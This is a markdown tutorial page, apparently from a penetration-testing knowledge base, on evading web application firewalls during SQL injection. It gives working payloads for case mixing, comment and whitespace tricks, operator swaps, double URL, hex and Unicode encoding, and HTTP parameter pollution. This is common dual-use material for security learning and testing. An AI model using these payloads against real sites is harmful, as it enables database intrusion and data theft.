---
title: 'WAF Bypassing for SQL Injection'
description: 'Manual evasion techniques such as case manipulation, using comments as whitespace, double URL encoding, and string concatenation.'
icon: material/shield-half-full
tags:
  - sql-injection
  - waf-bypass
  - evasion
---

# WAF Bypassing for SQL Injection

Web Application Firewalls (WAFs) like Cloudflare, AWS WAF, and ModSecurity use signature-based and behavioral analysis to block SQL injection payloads. A basic payload like `' UNION SELECT * FROM users--` will be blocked almost instantly.

To successfully exploit a modern web application, you must learn to **obfuscate** your payload so the WAF doesn't recognize it as SQL, while the backend database still executes it.

---

## 1. Keyword Evasion

WAFs often block common SQL keywords like `SELECT`, `UNION`, `AND`, `OR`, `WHERE`.

### Case Manipulation

Many basic WAF regex patterns match against specific cases (e.g., `SELECT`). SQL is case-insensitive, so you can mix cases.

*   `SeLeCt`
*   `uNIoN`
*   `wHeRe`

**Example:**
```sql
' UnIoN SeLeCt 1, 2, 3--
```

### Inline Comments

If the WAF blocks `UNION SELECT`, you can break the keyword up using inline comments `/**/`. The database ignores the comment and sees `UNION SELECT`.

*   `U/**/NION`
*   `SE/**/LECT`
*   `AN/**/D`

**Example:**
```sql
' U/**/NION S/**/ELECT 1, 2, 3--
```

### MySQL Versioned Comments

MySQL has a specific feature where it will execute code inside a comment if the comment starts with an exclamation mark `!`. WAFs often ignore anything inside comments.

*   `/*!SELECT*/`
*   `/*!50000SELECT*/` (Executes if MySQL version is >= 5.00.00)

**Example:**
```sql
' /*!UNION*/ /*!SELECT*/ 1, 2, 3--
```

---

## 2. Whitespace Evasion

WAFs often look for spaces between keywords (e.g., matching the regex `UNION\s+SELECT`).

### Using Comments as Spaces

Replace every space in your payload with `/**/`.

**Example:**
```sql
'/**/UNION/**/SELECT/**/1,2,3--
```

### Alternative Whitespace Characters

SQL engines accept many different whitespace characters besides the standard space (`%20`).

*   Tab: `%09`
*   Newline: `%0a`
*   Carriage Return: `%0d`
*   Vertical Tab: `%0b`
*   Form Feed: `%0c`

**Example (URL Encoded):**
```text
'%0aUNION%0cSELECT%091,2,3--
```

### Eliminating Spaces Entirely

Sometimes you don't need spaces at all, especially around symbols or parentheses.

**Example:**
```sql
-- Standard
' UNION SELECT username FROM users WHERE id=1--

-- No spaces
'UNION(SELECT(username)FROM(users)WHERE(id)=1)--
```

---

## 3. Operator and Function Evasion

If specific operators like `=` or `AND` are blocked, use equivalents.

### Logical Operators

*   Replace `AND` with `&&`
*   Replace `OR` with `||`

**Example:**
```sql
' || 1=1--
```

### Comparison Operators

If `=` is blocked:

*   `LIKE` (e.g., `id LIKE 1`)
*   `IN` (e.g., `id IN (1)`)
*   `BETWEEN` (e.g., `id BETWEEN 1 AND 1`)
*   `>` or `<` combinations

**Example:**
```sql
' OR 1 LIKE 1--
```

### Function Replacement

If a specific function like `SUBSTRING()` is blocked, use alternatives.

*   `SUBSTRING(string, 1, 1)`
*   `SUBSTR(string, 1, 1)`
*   `MID(string, 1, 1)`
*   `LEFT(string, 1)`
*   `RIGHT(string, 1)`

---

## 4. Encoding Evasion

WAFs decode input to inspect it. If you double-encode or use unexpected encodings, you might bypass the filter.

### URL Encoding and Double URL Encoding

*   **URL Encode:** `'` -> `%27`
*   **Double URL Encode:** `'` -> `%27` -> `%2527`

If the WAF decodes the input once, it sees `%27` (safe). The application might decode it a second time, turning it back into `'` (injection).

### Hex Encoding

Many databases allow you to specify strings as hex values to avoid using quotes entirely.

*   `'admin'` -> `0x61646d696e`

**Example:**
```sql
-- Instead of:
SELECT * FROM users WHERE username = 'admin'

-- Use:
SELECT * FROM users WHERE username = 0x61646d696e
```

### Unicode / Widechar Encoding

WAFs that are not configured to handle Unicode might miss payloads.

*   `'` -> `%u0027`
*   `S` -> `%u0053`

---

## 5. HTTP Parameter Pollution (HPP)

HPP involves sending multiple parameters with the same name. Different web servers process duplicates differently.

*   **PHP/Apache:** Uses the *last* occurrence.
*   **ASP.NET/IIS:** Concatenates all values with a comma.

**Attack Scenario (ASP.NET):**
```http
GET /page.aspx?id=1/*&id=*/UNION/*&id=*/SELECT/*&id=*/1,2,3 HTTP/1.1
```

*   **WAF sees:** `id=1/*` (Looks harmless)
*   **Application sees:** `id=1/*,*/UNION/*,*/SELECT/*,*/1,2,3`

The `/*,*/` creates inline comments, effectively resulting in `1 UNION SELECT 1,2,3`.
